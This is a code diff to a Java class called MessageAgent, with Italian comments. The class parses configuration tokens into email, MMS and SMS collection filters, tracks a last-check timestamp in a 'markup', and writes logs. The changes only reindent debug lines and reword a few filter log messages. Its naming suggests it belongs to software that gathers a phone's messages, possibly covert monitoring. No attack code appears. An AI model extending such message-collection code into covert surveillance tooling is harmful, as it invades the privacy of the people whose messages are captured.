@@ -138,7 +138,7 @@ public final class MessageAgent extends Agent {
      */
     void createLog(final byte[] additionalData, final byte[] content) {
         //#debug debug
-        debug.trace("createLog");
+                debug.trace("createLog");
 
         log.createLog(additionalData);
         log.writeLog(content);
@@ -154,14 +154,14 @@ public final class MessageAgent extends Agent {
 
         if (markupDate.isMarkup() == false) {
             // #debug debug
-            debug.trace("Il Markup non esiste, timestamp = 0 ");
+                        debug.trace("Il Markup non esiste, timestamp = 0 ");
             final Date date = new Date();
             lastcheck = 0;
 
         } else {
             byte[] deserialized;
             // #debug debug
-            debug.trace("Sto leggendo dal markup");
+                        debug.trace("Sto leggendo dal markup");
             try {
                 deserialized = markupDate.readMarkup();
                 lastcheck = Utils.byteArrayToLong(deserialized, 0);
@@ -198,7 +198,7 @@ public final class MessageAgent extends Agent {
                 identification = WChar.getString(conf, token.payloadStart,
                         token.length, false);
                 // #debug debug
-                debug.trace("Type 1: " + identification);
+                                debug.trace("Type 1: " + identification);
                 break;
             case Prefix.TYPE_FILTER:
                 // Filtro (sempre 2, uno COLLECT e uno REALTIME);
@@ -208,18 +208,18 @@ public final class MessageAgent extends Agent {
                     if (filter.isValid()) {
                         switch (filter.classtype) {
                         case Filter.CLASS_EMAIL:
-                            // #debug debug
-                            debug.trace("Adding email filter: " + filter.type);
+                            // #debug info
+                            debug.info("EMAIL: " + filter.type + " en:" + filter.enabled);
                             filtersEMAIL.put(filter.type, filter);
                             break;
                         case Filter.CLASS_MMS:
-                            // #debug debug
-                            debug.trace("Adding mms filter: " + filter.type);
+                            // #debug info
+                            debug.info("MMS: " + filter.type + " en:" + filter.enabled);
                             filtersMMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_SMS:
-                            // #debug debug
-                            debug.trace("Adding sms filter: " + filter.type);
+                            // #debug info
+                            debug.info("SMS: " + filter.type + " en:" + filter.enabled);
                             filtersSMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_UNKNOWN: // fall through
@@ -231,7 +231,7 @@ public final class MessageAgent extends Agent {
                         }
                     }
                     // #debug debug
-                    debug.trace("Type 2: header valid: " + filter.isValid());
+                                        debug.trace("Type 2: header valid: " + filter.isValid());
                 } catch (final Exception e) {
                     // #debug
                     debug.error("Cannot filter" + e);
@@ -244,7 +244,6 @@ public final class MessageAgent extends Agent {
                 break;
             }
 
-            // tokens.removeElementAt(i);
         }
 
         return true;
@@ -274,7 +273,7 @@ public final class MessageAgent extends Agent {
      */
     void updateMarkup() {
         // #debug debug
-        debug.trace("Sto scrivendo nel markup");
+                debug.trace("Sto scrivendo nel markup");
         final Date date = new Date();
         lastcheck = date.getTime();
         final byte[] serialize = Utils.longToByteArray(lastcheck);
